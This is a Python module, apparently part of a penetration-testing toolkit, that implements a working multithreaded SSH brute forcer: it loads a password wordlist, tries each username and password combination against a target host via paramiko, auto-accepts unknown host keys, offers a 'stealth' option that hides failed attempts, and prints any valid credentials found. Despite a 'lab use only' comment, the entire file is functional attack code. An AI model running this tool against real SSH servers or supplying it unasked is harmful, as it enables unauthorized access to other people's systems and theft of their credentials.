#!/usr/bin/env python3

# ─────────────────────────────────────────────
# modules/credentials/ssh_brute.py
# Lynkeus Initiative — SSH Brute Forcer
# Tests a wordlist of credentials against an SSH service
# Lab use only — run against machines you own
# ─────────────────────────────────────────────

import socket
import time
import concurrent.futures

# ── Attempt to import paramiko — required for SSH ────────────────
try:
    import paramiko
except ImportError:
    print ("[!] paramiko is not installed. Run: pip install paramiko")
    exit(1)

from output.colors import GREEN, RED, YELLOW, CYAN, DIM, BOLD, RESET


# ── Silence paramiko's internal transport logging ────────────────
import logging
logging.getLogger("paramiko").setLevel(logging.CRITICAL)


def ssh_connect(host, port, username, password, timeout):
    """
    # Attempts a single SSH login with the given credentials
    # Returns True if login succeeded, False if it failed
    """

    client = paramiko.SSHClient()

    # ── Auto-accept unknown host keys (lab use) ──────────────────
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(
            hostname = host,
            port     = port,
            username = username,
            password = password,
            timeout  = timeout,
            banner_timeout = timeout,
            auth_timeout   = timeout,
        )

        # ── Login succeeded ──────────────────────────────────────
        client.close()
        return True

    except paramiko.AuthenticationException:
        # ── Wrong credentials — expected during brute force ──────
        return False

    except (paramiko.SSHException, socket.error):
        # ── Connection issue — server may be throttling ──────────
        return None

    finally:
        client.close()


def run_ssh_brute(host, port, usernames, wordlist_path, threads, delay, timeout, stealth):
    """
    # Main brute force loop
    # Iterates over every username + password combination
    # Stops immediately when a valid credential is found
    """

    # ── Load password wordlist from file ─────────────────────────
    try:
        with open(wordlist_path, "r", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print ("[!] Wordlist not found: " + wordlist_path)
        return

    print ("")
    print (CYAN + "=" * 55 + RESET)
    print (BOLD + "  SSH BRUTE FORCER" + RESET)
    print (CYAN + "=" * 55 + RESET)
    print ("  Target    : " + BOLD + host + ":" + str(port) + RESET)
    print ("  Usernames : " + str(len(usernames)))
    print ("  Passwords : " + str(len(passwords)))
    print ("  Threads   : " + str(threads))
    print ("  Stealth   : " + (GREEN + "ON" if stealth else DIM + "OFF") + RESET)
    print (CYAN + "-" * 55 + RESET)
    print ("")

    found = []

    for username in usernames:

        print (YELLOW + "[*] Testing username: " + username + RESET)

        # ── Use thread pool for concurrent password testing ───────
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:

            futures = {
                executor.submit(ssh_connect, host, port, username, password, timeout): password
                for password in passwords
            }

            for future in concurrent.futures.as_completed(futures):
                password = futures[future]
                result   = future.result()

                if result is True:
                    # ── Valid credentials found ───────────────────
                    print ("")
                    print (GREEN + BOLD + "  [+] VALID CREDENTIALS FOUND" + RESET)
                    print (GREEN + "      Username : " + username + RESET)
                    print (GREEN + "      Password : " + password + RESET)
                    print ("")
                    found.append({"username": username, "password": password})

                    # ── Cancel remaining futures for this user ────
                    for f in futures:
                        f.cancel()
                    break

                elif result is None:
                    # ── Server issue — slow down ──────────────────
                    print (DIM + "  [~] Connection issue on " + username + ":" + password + " — skipping" + RESET)

                else:
                    # ── Wrong password — show attempt if not stealth
                    if not stealth:
                        print (RED + "  [-] " + username + ":" + password + RESET)

                # ── Apply delay between attempts ──────────────────
                if delay > 0:
                    time.sleep(delay)

    # ── Final summary ─────────────────────────────────────────────
    print (CYAN + "-" * 55 + RESET)

    if found:
        print (GREEN + BOLD + "  [+] " + str(len(found)) + " valid credential(s) found." + RESET)
        for cred in found:
            print (GREEN + "      " + cred["username"] + " : " + cred["password"] + RESET)
    else:
        print (RED + "  [-] No valid credentials found." + RESET)

    print (CYAN + "=" * 55 + RESET)
    print ("")

    return found
